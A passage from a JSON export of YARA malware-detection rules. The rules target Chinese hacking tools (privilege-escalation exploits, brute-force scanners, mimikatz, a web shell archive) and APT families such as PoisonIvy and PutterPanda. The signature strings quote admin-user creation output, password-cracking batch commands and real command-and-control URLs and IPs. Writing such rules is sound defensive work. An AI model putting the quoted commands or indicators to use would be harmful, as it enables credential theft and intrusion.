Ronald Huizer, (c) master#h4cker.us  \" fullword ascii\n      $s3 = \"[ ] Creating evil window\" fullword ascii\n      $s4 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 1 of them\n}","date":"2015-06-13 04:10:01","description":"Chinese Hacktool Set - file ms10048-x64.exe","minimum_yara":"1.7","name":"ms10048_x64_RID2A2F","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"54ac93e2d46d3047d2f20c841211e7e2","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule hscangui_RID2A63 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hscangui_RID2A63.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 05:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n      $s2 = \"http://www.cnhonker.com\" fullword ascii\n      $s3 = \"%s@ftpscan#Cracked account:  %s/%s\" fullword ascii\n      $s4 = \"[%s]: Found \\\"FTP account: %s/%s\\\" !!!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and 2 of them\n}","date":"2015-06-13 05:36:41","description":"Chinese Hacktool Set - file hscangui.exe","minimum_yara":"1.7","name":"hscangui_RID2A63","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"dc8f25d27462c1dc05c5f97276f54ce1","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule GoodToolset_ms11080_RID2DBD : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms11080.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:44:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n      $s2 = \"\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n      $s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n      $s4 = \"[*] Add to Administrators success\" fullword ascii\n      $s5 = \"[*] User has been successfully added\" fullword ascii\n      $s6 = \"[>] ms11-08 Exploit\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 2 of them\n}","date":"2015-06-13 10:44:41","description":"Chinese Hacktool Set - file ms11080.exe","minimum_yara":"1.7","name":"GoodToolset_ms11080_RID2DBD","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e81bf8edb7ebe43a15d022f0b81258d8","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule epathobj_exp64_RID2C74 : CHINA DEMO EXE FILE HKTL T1068 {\n   meta:\n      description = \"Chinese Hacktool Set - file epathobj_exp64_RID2C74.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:49:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n      $s2 = \"Exploit ok run command\" fullword ascii\n      $s3 = \"\\\\epathobj_exp\\\\x64\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n      $s4 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n      $s5 = \"Mutex object did not timeout, list not patched\" fullword ascii\n      $s6 = \"- inconsistent onexit begin-end variables\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them\n}","date":"2015-06-13 09:49:51","description":"Chinese Hacktool Set - file epathobj_exp64.exe","minimum_yara":"1.7","name":"epathobj_exp64_RID2C74","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"7771231155bc12199abdca015a5b9189","score":70,"tags":["T1068","DEMO","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule kelloworld_2_RID2BE1 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file kelloworld.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:25:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Hello World!\" fullword wide\n      $s2 = \"kelloworld.dll\" fullword ascii\n      $s3 = \"kelloworld de mimikatz pour Windows\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-13 09:25:21","description":"Chinese Hacktool Set - file kelloworld.dll","minimum_yara":"1.7","name":"kelloworld_2_RID2BE1","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"a16b74bbee70dd31cfe2460561eb8ac3","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule HScan_v1_20_hscan_RID2D11 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:16:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n      $s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100\" fullword ascii\n      $s3 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n      $s4 = \".\\\\log\\\\Hscan.log\" fullword ascii\n      $s5 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}","date":"2015-06-13 10:16:01","description":"Chinese Hacktool Set - file hscan.exe","minimum_yara":"1.7","name":"HScan_v1_20_hscan_RID2D11","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"57bcb3432ab195c4334f510fb48720c7","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule _Project1_Generate_rejoice_RID3142 : CHINA DEMO EXE FILE GEN HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:14:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, GEN, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sfUserAppDataRoaming\" fullword ascii\n      $s2 = \"$TRzFrameControllerPropertyConnection\" fullword ascii\n      $s3 = \"delphi32.exe\" fullword ascii\n      $s4 = \"hkeyCurrentUser\" fullword ascii\n      $s5 = \"%s is not a valid IP address.\" fullword wide\n      $s6 = \"Citadel hooking error\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}","date":"2015-06-13 13:14:51","description":"Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe","minimum_yara":"1.7","name":"_Project1_Generate_rejoice_RID3142","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"486f0d74834ccf318cad9740e912d523","score":70,"tags":["DEMO","FILE","CHINA","GEN","EXE","HKTL"]},{"author":"Florian Roth","content":"rule _hscan_hscan_hscangui_RID2F9A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 12:04:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".\\\\log\\\\Hscan.log\" fullword ascii\n      $s2 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n      $s3 = \"[%s]: checking \\\"FTP account: ftp/ftp@ftp.net\\\" ...\" fullword ascii\n      $s4 = \"[%s]: IPC NULL session connection success !!!\" fullword ascii\n      $s5 = \"Scan %d targets,use %4.1f minutes\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and all of them\n}","date":"2015-06-13 12:04:11","description":"Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe","minimum_yara":"1.7","name":"_hscan_hscan_hscangui_RID2F9A","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b2c687416b0d1a0020d158f081ed4f4b","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Kiwi_Tools_Mimikatz_1_RID2F4A : CHINA DEMO EXE FILE HKTL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Chinese Hacktool Set - from mimikatz files\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://blog.gentilkiwi.com/mimikatz\" ascii\n      $s2 = \"Benjamin Delpy\" fullword ascii\n      $s3 = \"GlobalSign\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-06-13 11:50:51","description":"Chinese Hacktool Set - from mimikatz files","minimum_yara":"1.7","name":"Kiwi_Tools_Mimikatz_1_RID2F4A","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"712107766e167b996c47c99918eee561","score":70,"tags":["T1178","T1097","T1075","DEMO","T1003","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule Kiwi_Tools_Mimikatz_2_RID2F4B : CHINA DEMO EXE FILE HKTL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Chinese Hacktool Set - from mimikatz files\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:51:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mimikatz\" fullword wide\n      $s2 = \"Copyright (C) 2012 Gentil Kiwi\" fullword wide\n      $s3 = \"Gentil Kiwi\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-06-13 11:51:01","description":"Chinese Hacktool Set - from mimikatz files","minimum_yara":"1.7","name":"Kiwi_Tools_Mimikatz_2_RID2F4B","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"3f8eff1759d7da877dff6ad9906dfded","score":70,"tags":["T1178","T1097","T1075","DEMO","T1003","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_Temp_RID2C07 : APT CHINA DEMO FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Temp.war\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:31:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"META-INF/context.xml<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\" fullword ascii\n      $s1 = \"browser.jsp\" fullword ascii\n      $s3 = \"cmd.jsp\" fullword ascii\n      $s4 = \"index.jsp\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 203KB and all of them\n}","date":"2015-06-13 09:31:41","description":"Chinese Hacktool Set - file Temp.war","minimum_yara":"1.7","name":"CN_Tools_Temp_RID2C07","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2d4e6926c4de49d9996463134c21f800","score":60,"tags":["APT","DEMO","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule sql1433_creck_RID2B93 : APT CHINA DEMO FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file creck.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:12:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"start anhao3.exe -i S.txt -p  pass3.txt -o anhao.txt -l Them.txt -t 1000\" fullword ascii\n      $s1 = \"start anhao1.exe -i S.txt -p  pass1.txt -o anhao.txt -l Them.txt -t 1000\" fullword ascii\n      $s2 = \"start anhao2.exe -i S.txt -p  pass2.txt -o anhao.txt -l Them.txt -t 1000\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7473 and filesize < 1KB and 1 of them\n}","date":"2015-06-13 09:12:21","description":"Chinese Hacktool Set - file creck.bat","minimum_yara":"1.7","name":"sql1433_creck_RID2B93","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"90b1b02de23c86a8e01282976c6e3ce2","score":60,"tags":["APT","DEMO","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule sql1433_Start_RID2B99 : APT CHINA DEMO HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Start.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:13:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n      $s2 = \"start creck.bat\" fullword ascii\n      $s3 = \"del s1.txt\" fullword ascii\n      $s4 = \"del Result.txt\" fullword ascii\n      $s5 = \"del s.TXT\" fullword ascii\n      $s6 = \"mode con cols=48 lines=20\" fullword ascii\n   condition: \n      filesize < 1KB and 2 of them\n}","date":"2015-06-13 09:13:21","description":"Chinese Hacktool Set - file Start.bat","minimum_yara":"1.7","name":"sql1433_Start_RID2B99","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e784fede5918b947dff3cced4d3c26df","score":60,"tags":["APT","DEMO","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule MAL_Fidelis_Advisory_Purchase_Order_pps_RID3661 : DEMO MAL {\n   meta:\n      description = \"Detects a string found in a malicious document named Purchase_Order.pps\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/ZjJyti\"\n      date = \"2015-06-09 16:53:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Users\\\\Gozie\\\\Desktop\\\\Purchase-Order.gif\" ascii\n   condition: \n      all of them\n}","date":"2015-06-09 16:53:21","description":"Detects a string found in a malicious document named Purchase_Order.pps","minimum_yara":"1.7","name":"MAL_Fidelis_Advisory_Purchase_Order_pps_RID3661","reference":"http://goo.gl/ZjJyti","required_modules":[],"rule_hash":"2e1c8fee28e77bdb5f6065f0e2d5337c","score":75,"tags":["DEMO","MAL"]},{"author":"Florian Roth","content":"rule PoisonIvy_Sample_APT_3_RID2F58 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a PoisonIvy Malware\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 11:53:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\notepad.exe\" fullword ascii\n      $s1 = \"\\\\RasAuto.dll\" fullword ascii\n      $s3 = \"winlogon.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}","date":"2015-06-03 11:53:11","description":"Detects a PoisonIvy Malware","minimum_yara":"1.7","name":"PoisonIvy_Sample_APT_3_RID2F58","reference":"VT Analysis","required_modules":[],"rule_hash":"0c0a66a68a80c08a83a022b4fc46e1f6","score":70,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PoisonIvy_Sample_APT_RID2EC6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects a PoisonIvy APT malware group\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 11:28:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"pidll.dll\" fullword ascii\n      $s1 = \"sens32.dll\" fullword wide\n      $s3 = \"FileDescription\" fullword wide\n      $s4 = \"OriginalFilename\" fullword wide\n      $s5 = \"ZwSetInformationProcess\" fullword ascii\n      $s9 = \"Microsoft Media Device Service Provider\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 47KB and all of them\n}","date":"2015-06-03 11:28:51","description":"Detects a PoisonIvy APT malware group","minimum_yara":"1.7","name":"PoisonIvy_Sample_APT_RID2EC6","reference":"VT Analysis","required_modules":[],"rule_hash":"90058a251417bae9d1acb97dabc47fef","score":70,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Malware_PutterPanda_Rel_RID3167 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects an APT malware related to PutterPanda\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 13:21:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x0 = \"app.stream-media.net\" fullword ascii\n      $x1 = \"File %s does'nt exist or is forbidden to acess!\" fullword ascii\n      $s6 = \"GetProcessAddresss of pHttpQueryInfoA Failed!\" fullword ascii\n      $s7 = \"Connect %s error!\" fullword ascii\n      $s9 = \"Download file %s successfully!\" fullword ascii\n      $s10 = \"index.tmp\" fullword ascii\n      $s11 = \"Execute PE Successfully\" fullword ascii\n      $s13 = \"aa/22/success.xml\" fullword ascii\n      $s16 = \"aa/22/index.asp\" fullword ascii\n      $s18 = \"File %s a Non-Pe File\" fullword ascii\n      $s19 = \"SendRequset error!\" fullword ascii\n      $s20 = \"filelist[%d]=%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( 4 of ( $s* ) )\n}","date":"2015-06-03 13:21:01","description":"Detects an APT malware related to PutterPanda","minimum_yara":"1.7","name":"APT_Malware_PutterPanda_Rel_RID3167","reference":"VT Analysis","required_modules":[],"rule_hash":"83c7029886bc572d4d3152499d7b9b4f","score":70,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule Regin_Related_Malware_RID2F4E : APT DEMO MAL {\n   meta:\n      description = \"Malware Sample - maybe Regin related\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 11:51:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%c%s%c -p %d -e %d -pv -c \\\"~~[%x] s; .%c%c%s %s /u %s_%d.dmp; q\\\"\" fullword wide\n      $s0 = \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\HotFix\" fullword wide\n      $s2 = \"%x:%x:%x:%x:%x:%x:%x:%x%c\" fullword ascii\n      $s3 = \"disp.dll\" fullword ascii\n      $s4 = \"msvcrtd.dll\" fullword ascii\n      $s5 = \"%d.%d.%d.%d%c\" fullword ascii\n      $s6 = \"%ls_%08x\" fullword wide\n      $s8 = \"d%ls%ls\" fullword wide\n      $s9 = \"Memory location: 0x%p, size 0x%08x\" fullword wide\n   condition: \n      $s1 or 3 of ( $s* )\n}","date":"2015-06-03 11:51:31","description":"Malware Sample - maybe Regin related","minimum_yara":"1.7","name":"Regin_Related_Malware_RID2F4E","reference":"VT Analysis","required_modules":[],"rule_hash":"52496acb2cabc8fc2e7daef38beb0c09","score":70,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule PoisonIvy_Sample_APT_2_RID2F57 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a PoisonIvy Malware\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 11:53:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"pidll.dll\" fullword ascii\n      $s1 = \"sens32.dll\" fullword wide\n      $s2 = \"9.0.1.56\" fullword wide\n      $s3 = \"FileDescription\" fullword wide\n      $s4 = \"OriginalFilename\" fullword wide\n      $s5 = \"ZwSetInformationProcess\" fullword ascii\n      $s6 = \"\\\"%=%14=\" fullword ascii\n      $s7 = \"091A1G1R1_1g1u1z1\" fullword ascii\n      $s8 = \"gHsMZz\" fullword ascii\n      $s9 = \"Microsoft Media Device Service Provider\" fullword wide\n      $s10 = \"Copyright (C) Microsoft Corp.\" fullword wide\n      $s11 = \"MFC42.DLL\" fullword ascii\n      $s12 = \"MSVCRT.dll\" fullword ascii\n      $s13 = \"SpecialBuild\" fullword wide\n      $s14 = \"PrivateBuild\" fullword wide\n      $s15 = \"Comments\" fullword wide\n      $s16 = \"040904b0\" fullword wide\n      $s17 = \"LegalTrademarks\" fullword wide\n      $s18 = \"CreateThread\" fullword ascii\n      $s19 = \"ntdll.dll\" fullword ascii\n      $s20 = \"_adjust_fdiv\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 47KB and all of them\n}","date":"2015-06-03 11:53:01","description":"Detects a PoisonIvy Malware","minimum_yara":"1.7","name":"PoisonIvy_Sample_APT_2_RID2F57","reference":"VT Analysis","required_modules":[],"rule_hash":"e22c13963b1026ed0fcc8b8dea77344c","score":70,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_Malware_PutterPanda_Rel_2_RID31F8 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"APT Malware related to PutterPanda Group\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 13:45:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://update.konamidata.com/test/zl/sophos/td/result/rz.dat?\" fullword ascii\n      $s1 = \"http://update.konamidata.com/test/zl/sophos/td/index.dat?\" fullword ascii\n      $s2 = \"Mozilla/4.0 (Compatible; MSIE 6.0;)\" fullword ascii\n      $s3 = \"Internet connect error:%d\" fullword ascii\n      $s4 = \"Proxy-Authorization:Basic\" fullword ascii\n      $s5 = \"HttpQueryInfo failed:%d\" fullword ascii\n      $s6 = \"read file error:%d\" fullword ascii\n      $s7 = \"downdll.dll\" fullword ascii\n      $s8 = \"rz.dat\" fullword ascii\n      $s9 = \"Invalid url\" fullword ascii\n      $s10 = \"Create file failed\" fullword ascii\n      $s11 = \"myAgent\" fullword ascii\n      $s12 = \"%s%s%d%d\" fullword ascii\n      $s13 = \"down file success\" fullword ascii\n      $s15 = \"error!\" fullword ascii\n      $s18 = \"Avaliable data:%u bytes\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 6 of them\n}","date":"2015-06-03 13:45:11","description":"APT Malware related to PutterPanda Group","minimum_yara":"1.7","name":"APT_Malware_PutterPanda_Rel_2_RID31F8","reference":"VT Analysis","required_modules":[],"rule_hash":"d8aac4d61260f18f1cf2f45b16458a37","score":70,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule PoisonIvy_Sample_APT_4_RID2F59 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects a PoisonIvy Sample APT\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 11:53:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft Software installation Service\" fullword wide\n      $s1 = \"idll.dll\" fullword ascii\n      $s2 = \"mgmts.dll\" fullword wide\n      $s3 = \"Microsoft(R) Windows(R)\" fullword wide\n      $s4 = \"ServiceMain\" fullword ascii\n      $s5 = \"Software installation Service\" fullword wide\n      $s6 = \"SetServiceStatus\" fullword ascii\n      $s7 = \"OriginalFilename\" fullword wide\n      $s8 = \"ZwSetInformationProcess\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 7 of them\n}","date":"2015-06-03 11:53:21","description":"Detects a PoisonIvy Sample APT","minimum_yara":"1.7","name":"PoisonIvy_Sample_APT_4_RID2F59","reference":"VT Analysis","required_modules":[],"rule_hash":"e4d80dd1dedeedb8ede74ae9b78eb747","score":70,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule PoisonIvy_Sample_5_RID2E16 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects PoisonIvy RAT sample set\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 10:59:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft Software installation Service\" fullword wide\n      $s2 = \"pidll.dll\" fullword ascii\n      $s3 = \"\\\\mspmsnsv.dll\" fullword ascii\n      $s4 = \"\\\\sfc.exe\" fullword ascii\n      $s13 = \"ServiceMain\" fullword ascii\n      $s15 = \"ZwSetInformationProcess\" fullword ascii\n      $s17 = \"LookupPrivilegeValueA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-03 10:59:31","description":"Detects PoisonIvy RAT sample set","minimum_yara":"1.7","name":"PoisonIvy_Sample_5_RID2E16","reference":"VT Analysis","required_modules":[],"rule_hash":"27964b182c4d499dd07553c9b2c9f969","score":70,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PoisonIvy_Sample_6_RID2E17 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects PoisonIvy RAT sample set\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 10:59:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"124.133.252.150\" fullword ascii\n      $x3 = \"http://124.133.254.171/up/up.asp?id=%08x&pcname=%s\" fullword ascii\n      $z1 = \"\\\\temp\\\\si.txt\" fullword ascii\n      $z2 = \"Daemon Dynamic Link Library\" fullword wide\n      $z3 = \"Microsoft Windows CTF Loader\" fullword wide\n      $z4 = \"\\\\tappmgmts.dll\" fullword ascii\n      $z5 = \"\\\\appmgmts.dll\" fullword ascii\n      $s0 = \"%USERPROFILE%\\\\AppData\\\\Local\\\\Temp\\\\Low\\\\ctfmon.log\" fullword ascii\n      $s1 = 